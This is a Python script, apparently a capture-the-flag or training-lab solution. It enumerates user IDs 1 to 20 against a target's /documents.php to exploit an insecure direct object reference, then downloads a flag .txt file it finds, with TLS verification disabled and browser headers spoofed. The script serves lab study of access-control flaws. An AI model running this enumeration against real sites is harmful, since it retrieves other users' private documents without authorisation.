""" 
---------------------------
MASS IDOR ENUMERATION
---------------------------

Repeat what you learned in this section to get a list of documents of the first 20 user uid's in /documents.php, one of which should have a '.txt' file with the flag.
"""

# Import Request to send web request to the internet
import requests
import sys
import requests
import re
# Module to display output in different colors.
from colorama import Fore, Back, Style
"""
Disable the display of certificate warnings when requests 
are made to websites using insecure certificates. This can 
be useful in scenarios where targeted web applications use 
self-signed certificates as is the case in the AWAE labs.
"""
requests.packages.urllib3.\
disable_warnings(requests.packages.urllib3.exceptions.InsecureRequestWarning)

def main():
    """
    Main entry point:
    - validate CLI args
    - build request info
    - simulate (or actually perform) the request
    - format and print the response blocks
    """
    # If the script is ran without specify the target
    if len(sys.argv) != 2:
        print(f"In CLI, Usage should be: {sys.argv[0]} target")
        print(f"Example: {sys.argv[0]} 10.0.0.1")
        print(f"Example: {sys.argv[0]} manageengine")
        sys.exit(1)

    # Obtain taregt from CLI
    target = sys.argv[1].strip().rstrip('/')   # from CLI202

    DEFAULT_HEADERS = {
    "User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0",
    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
    "Accept-Language": "en-US,en;q=0.5",
    "Referer": "",  # can set if needed
    "Connection": "keep-alive",
    "Upgrade-Insecure-Requests": "1",
    }

    # Optional headers to mimic your Burp capture
    HEADERS = {
        "User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0",
        "Accept": "*/*",
        "X-Requested-With": "XMLHttpRequest",
        "Origin": "http://{target}",
        "Referer": "http://{target}/",
        # don't set Content-Type here — requests will set the correct multipart boundary
    }

    
    # ============================ UPLOAD URL of TARGET ============================ #
    target_url = f"http://{target}"
    documents_path = "/documents.php"

    # ============================ Initiate the Request to UPLOAD PHP FILE  ============================ #
    try:
        # WARNING: verify=False disables TLS certificate verification.
        r = requests.get(target_url, verify=False, timeout=10)
    except requests.RequestException as e:
        print(f"Request failed: {e}")
        sys.exit(2)
    # ============================ FORMAT OUTPUT ============================ #
    print_response(r)


    # ============================ Initiate the POST Request to Reset Password  ============================ #
    # --data "uid=1"
    POST_DATA = {
        "uid": "",  # to be set in loop
    }
    for uid in range(1,21):
        print(f"\n----- Attempting to retrieve documents for uid={uid} -----")
        POST_DATA["uid"] = str(uid)

        try:
            # WARNING: verify=False disables TLS certificate verification.
            r = requests.post(target_url+documents_path, headers={"User-Agent": HEADERS["User-Agent"]}, data=POST_DATA, verify=False, timeout=10)
        except requests.RequestException as e:
            print(f"Request failed: {e}")
            sys.exit(2)   
        
        response_text = r.text
        if ".txt" in response_text:
            print(Fore.GREEN + Style.BRIGHT + f"[+] Found .txt document for uid={uid}!" + Style.RESET_ALL)
            # Print the file out
            flag_location = response_text.strip('.txt')
            print(f"flag file is: {response_text.strip('.txt')}")  # print first line only
            
            for line in flag_location.split():
                # look for .txt file link
                if '.txt' in line:
                    flag_url = line.strip('href').strip("=").strip("'")
                    print("FLAG URL ", flag_url)
                    # ============================ Initiate the GET Request to retrieve FLAG document  ============================ #
                    try:
                        flag_response = requests.get(f"http://{target}/{flag_url}", headers={"User-Agent": HEADERS["User-Agent"]}, verify=False, timeout=10)
                        print(Fore.CYAN + Style.BRIGHT + f"[+] Retrieved flag document content for uid={uid}:" + Style.RESET_ALL)
                        print(flag_response.text)
                    except requests.RequestException as e:
                        print(f"Request failed: {e}")
                        sys.exit(2)
                    
                    break
            break # exit loop after finding the flag
   

def print_response(r):
    """
    Helper to print response info.
    - r: requests.Response object
    """
    print("\n======= Johnny Custom Exploit Development =======\n")
    print(format_text("REQUEST METHOD:", r.request.method))
    print(format_text("REQUEST URL:", r.request.url))
    print(format_text("REQUEST HEADERS | r.headers is: :", r.request.headers))
    print(format_text("REQUEST BODY (raw):", r.request.body))   # shows form-encoded body
    print(format_text("RESPONSE STATUS | r.status_code is:", r.status_code))
    print(format_text("RESPONSE COOKIES | r.cookies is:", r.cookies))
    print(format_text("RESPONSE CONTENT-LENGTH:", len(r.text)))
    print(format_text("RESPONSE (first 300 chars):\n", r.text))


def format_text(title,item):
  """
    Helper to create a nicely formatted console output block.

    - title: short label for the section (e.g. "r.status_code is:")
    - item: item to display (will be stringified)
    Returns a string that contains the title, a separator, the item, and a short marker.
  """
  cr = '\r\n'
  section_break = cr +  "*" * 20 + cr
  item = str(item)
  text = Style.BRIGHT + Fore.RED + title + Fore.RESET + section_break + item + section_break + '\t'
  return text

if __name__ == "__main__":
    main()